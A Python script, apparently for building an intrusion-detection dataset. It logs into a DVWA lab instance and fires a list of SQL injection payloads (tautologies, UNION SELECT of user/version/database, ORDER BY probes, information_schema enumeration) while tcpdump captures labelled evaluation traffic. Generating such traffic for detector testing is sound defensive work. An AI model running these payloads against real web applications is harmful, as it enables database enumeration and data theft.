import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS SQLI EVALUACION MEDIUM
# DISTINTOS a entrenamiento_sqli.py (low) Y
# DISTINTOS a entrenamiento_sqli_medium.py (medium)
# =============================================

PAYLOADS_SQLI_EVAL_MEDIUM = [
    # Variantes numericas distintas
    "3 OR 1=1",
    "4 OR 1=1",
    "5 OR 1=1",
    "3 AND 1=1",
    "4 AND 1=1",
    "5 AND 1=1",
    "3 OR 2=2",
    "4 OR 2=2",
    # UNION distintos al entrenamiento
    "2 UNION SELECT 1,2",
    "3 UNION SELECT 1,2",
    "0 UNION SELECT 2,1",
    "2 UNION SELECT null,null",
    "2 UNION SELECT user(),version()",
    "2 UNION SELECT version(),user()",
    "2 UNION SELECT database(),user()",
    "0 UNION SELECT 2,database()",
    # ORDER BY distintos
    "3 ORDER BY 1",
    "4 ORDER BY 1",
    "5 ORDER BY 2",
    "3 ORDER BY 2",
    # Subqueries distintas
    "2 AND (SELECT 1)=1",
    "3 AND (SELECT 1)=1",
    "2 AND (SELECT COUNT(*) FROM users)>0",
    "2 AND (SELECT COUNT(*) FROM users)>1",
    "2 AND LENGTH(database())>2",
    "2 AND LENGTH(database())>4",
    "2 AND LENGTH(version())>3",
    # UNION con information_schema distintos
    "2 UNION SELECT table_name,2 FROM information_schema.tables LIMIT 1",
    "0 UNION SELECT 2,table_name FROM information_schema.tables LIMIT 1",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli_eval_medium(session):
    print("\n[*] Iniciando ataques SQLi MEDIUM (evaluacion)...")
    payloads = PAYLOADS_SQLI_EVAL_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.post(f"{BASE_URL}/vulnerabilities/sqli/",
                             data={"id": payload, "Submit": "Submit"})
            print(f"  SQLi_EVAL_M | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi Medium evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: SQL INJECTION — NIVEL MEDIUM")
    print("  Etiqueta real: 'sqli'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_sqli_medium.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_sqli_eval_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_sqli_medium.pcap")
    print("="*60)
